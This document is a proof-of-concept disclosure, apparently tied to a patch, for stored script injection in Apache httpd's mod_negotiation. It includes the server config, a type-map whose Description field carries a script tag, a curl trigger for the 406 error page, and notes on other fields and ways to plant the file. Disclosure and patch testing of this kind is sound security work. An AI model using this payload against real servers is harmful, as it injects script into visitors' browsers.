# PoC 103 — Unescaped Variant List Fields In Error HTML

`mod_negotiation` builds the `variant-list` note from type-map fields without
HTML-escaping. Attacker-controlled `Description:` etc. is reflected verbatim
into the canned 406 error body, yielding stored HTML/script injection.

## Setup

Build with `mod_negotiation` and `mod_mime` enabled.

`httpd.conf`:

```apache
ServerName 127.0.0.1
Listen 8080
LoadModule mpm_event_module modules/mod_mpm_event.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule mime_module modules/mod_mime.so
LoadModule negotiation_module modules/mod_negotiation.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule log_config_module modules/mod_log_config.so

ErrorLog logs/error_log
PidFile  logs/httpd.pid
DocumentRoot "/tmp/htdocs"

<Directory "/tmp/htdocs">
    Options +MultiViews
    AddHandler type-map .var
    Require all granted
</Directory>
```

Type-map `safe.var` placed in `/tmp/htdocs`:

```text
URI: safe

URI: safe.html
Content-Type: text/html
Description: <script>alert('xss-from-type-map')</script>
```

A real (but never selected) variant body:

```bash
mkdir -p /tmp/htdocs
printf '<html><body>real</body></html>' > /tmp/htdocs/safe.html
```

## Trigger

Make the only variant unacceptable so a `406` response is generated and the
unescaped `Description` is folded into the canned error HTML:

```bash
curl -sv -H 'Accept: image/png' http://127.0.0.1:8080/safe.var > /tmp/406.html
```

## Observed effect

The 406 body returned with `Content-Type: text/html` contains the unescaped
descriptor, e.g.:

```html
<li><a href="safe.html">safe.html</a> , <script>alert('xss-from-type-map')
</script>, type text/html</li>
```

Confirm with:

```bash
grep -F "<script>alert('xss-from-type-map')</script>" /tmp/406.html
```

The token appears verbatim. Loaded in a browser, the inline script executes
in the origin of the httpd instance. With the patch applied, the same fetch
returns the description wrapped in `&lt;script&gt;...&lt;/script&gt;` and no
script runs.

## Notes

- Any of `Content-Type:`, `Content-Language:`, `Content-Charset:`,
  `Content-Encoding:` reach the same sink and can be substituted for
  `Description:`.
- The trigger does not require authentication; a publishable type-map is
  enough — for example one written by a CGI, a PUT-enabled WebDAV area, or
  an admin who pasted untrusted text.
